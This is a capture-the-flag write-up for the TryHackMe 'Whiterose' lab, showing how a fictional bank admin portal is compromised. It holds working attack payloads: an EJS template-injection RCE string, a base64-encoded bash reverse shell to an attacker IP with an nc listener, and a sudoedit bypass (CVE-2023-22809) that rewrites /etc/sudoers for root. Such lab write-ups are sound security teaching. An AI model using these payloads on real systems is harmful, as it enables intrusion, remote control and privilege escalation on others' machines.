---
clayout: ctf
title: Whiterose
type: TryHackMe
date: 2025-02-22
level: Easy
icon: /ctf/tryhackme/whiterose/icon-room.png
image: /ctf/tryhackme/whiterose/icon-room.png
description: Yet another Mr. Robot themed challenge.
ctf-link: https://tryhackme.com/room/whiterose
---

## Challenge description

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

Go ahead and start the machine, **it may take a few minutes to fully start up.**

And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`

## Challenge overview

In this challenge, participants are tasked with penetrating the security of a fictional bank's administrative portal.
Starting with limited information, including a set of user credentials, the goal is to explore the web application's
structure, identify vulnerabilities such as parameter manipulation and remote code execution (RCE), and ultimately
escalate privileges to obtain sensitive information.

## Enumeration

### Nmap

We begin by scanning the target machine to identify open ports and services:

```bash
$ nmap -sC -sV -v -oN whiterose.nmap 10.10.103.134
Nmap scan report for 10.10.103.134
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b907960dc4b60cd6221ae46c8eac6f7d (RSA)
|   256 baff923e0f037eda30cae3528d47d96c (ECDSA)
|_  256 5de41439ca061747935386de2b77097d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Findings:

- **Port 22**: SSH service running OpenSSH 7.6p1
- **Port 80**: HTTP service running nginx 1.14.0

### Web Enumeration

Navigating to `http://cyprusbank.thm/` displays the homepage of the web application:

![Whiterose - Home page](/ctf/tryhackme/whiterose/home.png)

The site is currently under maintenance and does not provide any useful information. Using `gobuster`, we can identify
DNS subdomains:

```bash
$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u cyprusbank.thm  -t 20 --append-domain
```

The scan reveals an `admin` subdomain:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cyprusbank.thm
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cyprusbank.thm Status: 302 [Size: 28] [--> /login]

===============================================================
Finished
===============================================================
```

Navigating to `http://admin.cyprusbank.thm/` displays a login page:

![Whiterose - admin login page](/ctf/tryhackme/whiterose/login.png)

Using the provided credentials `Olivia Cortez:olivi8` logs us into the admin panel:

![Whiterose - admin panel](/ctf/tryhackme/whiterose/admin-panel.png)

Exploring the `Messages` section:

![Whiterose - Messages](/ctf/tryhackme/whiterose/messages.png)

Observing the URL of the messages, we notice a `c` parameter:

```bash
http://admin.cyprusbank.thm/messages/?c=5
```

Modifying the `c` parameter to `8` reveals a sensitive message:

![Whiterose - Sensitive message](/ctf/tryhackme/whiterose/sensitive-message.png)

We now have a new set of credentials: `Gayle Bev:p~]P@5!6;rs558:q`. Logging into the admin panel with these credentials
grants access to additional sections. In the `Search` section, searching for the user "Tyrell Wellick" reveals their
phone number:

![Whiterose - Search](/ctf/tryhackme/whiterose/search.png)

The `Settings` section is also accessible:

![Whiterose - Settings](/ctf/tryhackme/whiterose/settings.png)

Intercepting the request with `Burp Suite`:

![Whiterose - Burp Suite](/ctf/tryhackme/whiterose/settings-burp.png)

By modifying a parameter name, such as changing `password` to `password1`, the application returns an error message:

![Whiterose - Error message](/ctf/tryhackme/whiterose/error-message.png)

This error message indicates that the application use `ejs` to render the views. Looking on the web, we can find a RCE
vulnerability in `ejs` that allows us to execute arbitrary code. We can base on the following payload found on the
[Snyk website](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307)

```bash
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');
```

Adding this payload to the request results in a SyntaxError. To prevent this, append `//` to comment out the rest of the
code:

```bash
&settings[view options][outputFunctionName]=x;global.process.mainModule.require('child_process').execSync('ls -al');//
```

Now no error is returned but your code return nothing. This is because the code is executed in the server side and we
don't
return the output from our payload:

```bash
&settings[view options][outputFunctionName]=x;return+global.process.mainModule.require('child_process').execSync('ls -al');//
```

## Reverse shell

We can use the following payload to open a reverse shell:

```bash
&settings[view options][outputFunctionName]=x;return+global.process.mainModule.require('child_process').execSync('echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjEyNS4yNDYvNDQ0NCAwPiYx|base64+-d|bash');//
```

Now we can listen on our machine:

```bash
$ nc -lvnp 4444
```

And send the request to the server:

```bash
web@cyprusbank:~/app$ id
id
uid=1001(web) gid=1001(web) groups=1001(web)
```

We can now read the user flag:

```bash
web@cyprusbank:~$ cat user.txt
cat user.txt
THM{user_flag}
```

## Privilege escalation

Looking for the `sudo` permissions:

```bash
web@cyprusbank:~$ sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We found on the web
this [sudoedit bypass](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)
post that explain how to exploit this vulnerability. We can use the following payload to get a root shell:

```bash
web@cyprusbank:~$ export EDITOR="vi -- /etc/sudoers"
web@cyprusbank:~$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Will open the `/etc/sudoers` file in `vi`. Now we can add the following line to the file under the
`root ALL=(ALL:ALL) ALL` line:

```bash
web ALL=(ALL:ALL) NOPASSWD: ALL
```

Now we can save the file and exit `vi` and execute the following command to get a root shell and get the root flag:

```bash
web@cyprusbank:~$ sudo su
root@cyprusbank:/home/web# id
uid=0(root) gid=0(root) groups=0(root)
root@cyprusbank:/home/web# cd
root@cyprusbank:~# cat root.txt
THM{root_flag}
```

## References

- [Snyk - EJS Remote Code Execution](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307)
- [Vicarius - CVE-2023-22809 sudoedit bypass analysis](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)

